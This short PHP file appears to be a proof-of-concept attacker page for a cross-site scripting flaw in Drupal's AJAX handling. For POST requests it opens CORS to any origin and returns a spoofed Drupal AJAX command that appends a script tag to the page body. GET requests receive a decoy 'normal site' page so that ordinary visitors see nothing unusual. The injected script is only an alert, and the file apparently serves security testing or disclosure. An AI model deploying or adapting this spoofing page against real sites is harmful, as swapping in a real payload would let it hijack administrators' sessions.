<?php

// Only display the spoof response if the method is POST, this way normal users
// (i.e. non-admins) will see a normal page.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // Allow any site to make a POST request here.
  header('Access-Control-Allow-Origin: *');
  // Form a bare-bones JSON response for Drupal.
  $foo = new stdClass();
  $foo->command = 'insert';
  $foo->data = '<script>alert("xss")</script>';
  $foo->method = 'append';
  $foo->selector = 'body';
  echo json_encode(array($foo));
}
// Display the normal page for GET requests.
else {
  echo "<h1>This is a normal site!</h1>";
}
